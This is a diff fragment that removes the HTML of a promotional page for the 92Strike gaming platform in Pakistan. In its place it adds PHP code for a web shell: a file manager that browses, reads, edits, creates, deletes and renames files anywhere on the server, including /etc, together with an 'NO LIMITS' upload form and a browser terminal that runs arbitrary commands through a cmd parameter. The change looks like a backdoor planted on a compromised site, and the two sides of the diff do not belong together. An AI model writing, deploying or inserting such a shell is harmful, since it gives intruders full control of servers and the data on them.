-            <p><a href ="https://92-strikegame.com.pk/" title ="92Strike Login"><strong>92Strike Login</strong></a> illustrates how a locally oriented gaming platform can respond to the needs of modern users. Through accessible design, diverse interactive opportunities, secure systems, and community engagement, it contributes to Pakistan’s evolving digital entertainment landscape.</p>
-
-            <p>With continued technological progress and rising interest in online activities, services like 92Strike may remain influential in shaping the future of gaming within the country.</p>
-        </article>
-
-        <!-- FAQ Section -->
-        <section id="faq" class="faq-section">
-            <h2>Frequently Asked Questions (FAQ)</h2>
-            
-            <div class="faq-item">
-                <h3>1. What is 92 Strike Pakistan?</h3>
-                <p>92Strike is an online gaming platform that provides interactive digital entertainment for users interested in competitive and casual gaming experiences.</p>
-            </div>
-
-            <div class="faq-item">
-                <h3>2. Is the platform accessible on smartphones?</h3>
-                <p>Yes, it is designed with responsive technology that allows smooth performance on mobile devices as well as desktop computers.</p>
-            </div>
-
-            <div class="faq-item">
-                <h3>3. How does 92Strike protect user information?</h3>
-                <p>The platform uses encryption systems and verification procedures to safeguard personal data and maintain secure transactions.</p>
-            </div>
-
-            <div class="faq-item">
-                <h3>4. Are there competitive features on the platform?</h3>
-                <p>Yes, leaderboards, rankings, and special events allow players to compete and track their progress.</p>
-            </div>
-
-            <div class="faq-item">
-                <h3>5. Why is online gaming becoming popular in Pakistan?</h3>
-                <p>Increasing smartphone adoption, improved internet connectivity, and growing interest in digital entertainment have all contributed to the rise of online gaming in the country.</p>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <p>&copy;2023 92Strike Pakistan. All Rights Reserved.</p>
-    </footer>
-
-<div id="rajabuaya-popup" style="
-  position: fixed;
-  z-index: 9999;
-  width: 100vw;
-  height: 100vh;
-  top: 0;
-  left: 0;
-  background: rgba(0,0,0,0.85); 
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 16px;
-  box-sizing: border-box;
-  overflow-y: auto;
-">
-  <style>
-    /* BORDER MENYALA */
-    .glow-box {
-      animation: glow 1.8s infinite alternate;
-      border-radius: 8px;
-    }
-    @keyframes glow {
-      0% { box-shadow: 0 0 6px rgb(204 97 19); }
-      100% { box-shadow: 0 0 20px rgb(255,136,0); }
-    }
-
-    /* FLASH BERGERAK KE KANAN */
-    .flash-img {
-      position: relative;
-      overflow: hidden;
-    }
-
-    .flash-img::after {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 50%;
-      height: 100%;
-      background: linear-gradient(
-        to right,
-        rgba(255,255,255,0) 0%,
-        rgb(255 240 0) 50%,
-        rgba(255,255,255,0) 100%
-      );
-      animation: flashMove 2s linear infinite;
-    }
-
-    @keyframes flashMove {
-      0% { left: -100%; }
-      100% { left: 150%; }
-    }
-
-    /* EFEK GELOMBANG PADA GAMBAR */
-    .wave-effect {
-      animation: wave 3s ease-in-out infinite;
-      transform-origin: center;
-      display: block;
-    }
-
-    @keyframes wave {
-      0% { transform: scale(1) skewX(0deg); }
-      25% { transform: scale(1.02) skewX(2deg); }
-      50% { transform: scale(1) skewX(0deg); }
-      75% { transform: scale(1.02) skewX(-2deg); }
-      100% { transform: scale(1) skewX(0deg); }
-    }
-  </style>
-
-  <div style="display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px;">
-    <div class="glow-box" style="width: 100%; font-family: Arial, sans-serif; background: rgb(240, 128, 128 / 75%); border: 1px solid rgb(255 240 0); overflow: hidden; font-size: 14px;">
-      <h2 style="color: white; font-size: 16px; text-align: center; font-weight: bold; line-height: 1.4; margin: 16px;">
-       92Strike Pakistan - A Growing Name in the Country’s Online Gaming Landscape
-      </h2>
-
-      <div class="flash-img" style="display: flex; justify-content: center; align-items: center; margin: 15px; border-radius: 12px;">
-        <img class="wave-effect" src="https://i.ibb.co/d0GjKzzm/92strike.png" alt="92Strike" style="width: 100%; border-radius: 12px;" />
-      </div>
-
-      <div style="display: flex; justify-content: space-between; width: 100%; gap: 1px; margin-bottom: 16px;">
-        <a href="https://www.92strike66.com/#/register?invitationCode=16835100105" style="margin: 10px; flex: 1; background: rgb(204 97 19); height: 44px; line-height: 44px; text-align: center; color: black; font-weight: bold; font-size: 16px; text-decoration: none; border-radius: 6px; font-family: 'Segoe UI', sans-serif; box-shadow: 0 0 8px rgba(0,0,0,0.6);">
-          Login/Register I
-        </a>
-        <a href="https://www.92strike6.com/#/register?invitationCode=62671100050" style="margin: 10px; flex: 1; background: rgb(255 240 0); height: 44px; line-height: 44px; text-align: center; color: black; font-weight: bold; font-size: 16px; text-decoration: none; border-radius: 6px; font-family: 'Segoe UI', sans-serif; box-shadow: 0 0 8px rgba(0,0,0,0.6);">
-          Login/Register II
-        </a>
-      </div>
-
     </div>
-  </div>
+</div>';
 
-  <!-- Script untuk menutup popup saat klik area gelap -->
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const popup = document.getElementById("rajabuaya-popup");
+// Upload form
+echo '<form method="post" enctype="multipart/form-data" class="card">
+    <input type="file" name="file" required>
+    <button name="upload" class="btn" style="margin-top:5px">Upload File (NO LIMITS)</button>
+</form>';
 
-      popup.addEventListener("click", function (e) {
-        // Jika yang diklik adalah background (bukan isi box)
-        if (e.target === popup) {
-          popup.style.display = "none";
+// Create folder form
+echo '<form method="post" class="card">
+    <input name="newfolder" placeholder="New Folder Name" required>
+    <button class="btn" style="margin-top:5px">Create Folder</button>
+</form>';
+
+// Edit file section
+if (isset($_GET["edit"])) {
+    $editPath = $_GET["edit"];
+    
+    // Try to read file
+    $content = '';
+    $error = '';
+    
+    if (file_exists($editPath) && is_file($editPath)) {
+        if (is_readable($editPath)) {
+            $content = htmlspecialchars(file_get_contents($editPath), ENT_QUOTES, 'UTF-8');
+        } else {
+            $error = 'File exists but is not readable!';
         }
-      });
-    });
-  </script>
-</div>
+    } else {
+        // Allow creating new files anywhere
+        $error = 'File doesn\'t exist. Will create new file at: ' . htmlspecialchars($editPath);
+    }
+    
+    echo '<div class="card">
+        <h3>📝 Editing: ' . htmlspecialchars($editPath) . '</h3>';
+    
+    if ($error) {
+        echo '<div class="warning">' . $error . '</div>';
+    }
+    
+    echo '<form method="post">
+        <input type="hidden" name="file" value="' . htmlspecialchars($editPath) . '">
+        <textarea name="content" style="height:70vh; font-family:monospace;">' . $content . '</textarea>
+        <div style="margin-top:10px">
+            <button name="editfile" class="btn">Save Changes</button>
+            <a href="?d=' . urlencode($path) . '" class="btn btn-danger">Cancel</a>
+        </div>
+    </form>
+    </div>';
+    
+    echo '</div></body></html>';
+    exit;
+}
 
-<script>
+// File listing
+echo '<div class="card">';
+echo '<table>';
 
-const pesan = "Can't Take It 😊";
+// Root and parent directory links
+echo '<tr>
+    <td colspan="2">
+        <a href="?d=/" class="btn-warning" style="padding:5px 10px;font-size:0.9em">📍 Root (/)</a>';
+if ($path !== "/" && $path !== "") {
+    $parent = dirname($path);
+    echo '<a href="?d=' . urlencode($parent) . '" class="btn" style="padding:5px 10px;font-size:0.9em;margin-left:5px">⬆️ Parent Directory</a>';
+}
+echo '</td></tr>';
 
-document.addEventListener("contextmenu", function(e){
-    e.preventDefault();
-    alert(pesan);
-});
-
-document.addEventListener("keydown", function(e){
-    if(e.ctrlKey){
-        if(e.key === "c" || e.key === "u" || e.key === "s" || e.key === "C" || e.key === "U" || e.key === "S"){
-            e.preventDefault();
-            alert(pesan);
+// Scan directory
+if (is_dir($path) && is_readable($path)) {
+    $files = @scandir($path);
+    if ($files === false) {
+        echo '<tr><td colspan="2" style="color:#f33;">❌ Cannot read directory (permission denied?)</td></tr>';
+    } else {
+        foreach ($files as $f) {
+            if ($f == "." || $f == "..") continue;
+            
+            $fullPath = $path . "/" . $f;
+            $isDir = is_dir($fullPath);
+            
+            echo '<tr>';
+            
+            // Name column
+            echo '<td>';
+            if ($isDir) {
+                echo '📁 <a href="?d=' . urlencode($fullPath) . '">' . htmlspecialchars($f) . '</a>';
+            } else {
+                echo '📄 <a href="?d=' . urlencode($path) . '&edit=' . urlencode($fullPath) . '">' . htmlspecialchars($f) . '</a>';
+                if (file_exists($fullPath)) {
+                    echo '<div class="file-size">' . formatSize(filesize($fullPath)) . ' | ' . date("Y-m-d H:i:s", filemtime($fullPath)) . '</div>';
+                }
+            }
+            echo '</td>';
+            
+            // Actions column
+            echo '<td class="actions" style="text-align:right">';
+            if (!$isDir) {
+                // Delete link
+                echo '<a href="?d=' . urlencode($path) . '&del=' . urlencode($fullPath) . '" onclick="return confirm(\'Delete this file?\')" style="color:#f33;margin-right:10px">🗑️ Delete</a>';
+                
+                // Rename form
+                echo '<form method="get" style="display:inline-block">
+                    <input type="hidden" name="d" value="' . htmlspecialchars($path) . '">
+                    <input type="hidden" name="r" value="' . htmlspecialchars($fullPath) . '">
+                    <input name="new" placeholder="New name" value="' . htmlspecialchars($f) . '" style="width:150px;display:inline-block">
+                    <button class="btn" type="submit">✏️ Rename</button>
+                </form>';
+            } else {
+                echo '<a href="?d=' . urlencode($fullPath) . '" class="btn">📂 Open</a>';
+            }
+            echo '</td>';
+            
+            echo '</tr>';
         }
     }
-    if(e.key === "F12"){
+} else {
+    echo '<tr><td colspan="2" style="color:#f33;">❌ Not a directory or permission denied: ' . htmlspecialchars($path) . '</td></tr>';
+}
+
+echo '</table>';
+echo '</div>';
+
+// Quick jump to common directories
+echo '<div class="card">
+    <h4>Quick Jump:</h4>
+    <div style="display:flex;flex-wrap:wrap;gap:5px;">
+        <a href="?d=/" class="btn">/ (Root)</a>
+        <a href="?d=/etc" class="btn">/etc</a>
+        <a href="?d=/var" class="btn">/var</a>
+        <a href="?d=/tmp" class="btn">/tmp</a>
+        <a href="?d=/home" class="btn">/home</a>
+        <a href="?d=/usr" class="btn">/usr</a>';
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+    echo '<a href="?d=C:\\" class="btn">C:\\</a>';
+    echo '<a href="?d=C:\\Windows" class="btn">C:\\Windows</a>';
+    echo '<a href="?d=C:\\Users" class="btn">C:\\Users</a>';
+}
+echo '</div></div>';
+
+echo '</div>';
+
+// JavaScript for Terminal
+echo '<script>
+function quickCommand(cmd) {
+    document.getElementById("commandInput").value = cmd;
+    document.getElementById("commandInput").focus();
+}
+
+function clearTerminal() {
+    document.getElementById("terminalOutput").innerHTML = \'<div style="color:#666">Command output cleared...</div>\';
+}
+
+function executeTerminal() {
+    const form = document.getElementById("terminalForm");
+    const cmdInput = document.getElementById("commandInput");
+    const outputDiv = document.getElementById("terminalOutput");
+    const cmd = cmdInput.value.trim();
+    
+    if (!cmd) return false;
+    
+    // Show loading
+    outputDiv.innerHTML = \'<div style="color:#0af">Executing: \' + cmd + \'...</div>\';
+    
+    // AJAX request
+    fetch(\'?ajax=1&cmd=\' + encodeURIComponent(cmd))
+        .then(response => response.json())
+        .then(data => {
+            outputDiv.innerHTML = \'<div><strong>Command:</strong> \' + cmd + \'</div>\' +
+                                  \'<div class="cmd-method">Method: \' + data.method + \'</div>\' +
+                                  \'<hr style="border-color:#333;margin:10px 0">\' +
+                                  data.output.replace(/\\n/g, \'<br>\');
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+            cmdInput.value = \'\';
+            cmdInput.focus();
+        })
+        .catch(error => {
+            outputDiv.innerHTML = \'<div style="color:#f00">Error: \' + error + \'</div>\';
+        });
+    
+    return false; // Prevent form submission
+}
+
+// Enter key shortcut
+document.addEventListener("keydown", function(e) {
+    if (e.target.id === "commandInput" && e.key === "Enter" && !e.shiftKey) {
         e.preventDefault();
-        alert(pesan);
+        executeTerminal();
     }
 });
 
-document.addEventListener('selectstart', function(e){
-    e.preventDefault();
-});
-</script>         
+// Focus command input on page load
+document.getElementById("commandInput")?.focus();
+</script>';
 
-</body>
-</html>
+echo '</body></html>';
+
+// Helper function to format file size
+function formatSize($bytes) {
+    if ($bytes == 0) return "0 B";
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = floor(log($bytes, 1024));
+    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
+}
+?>
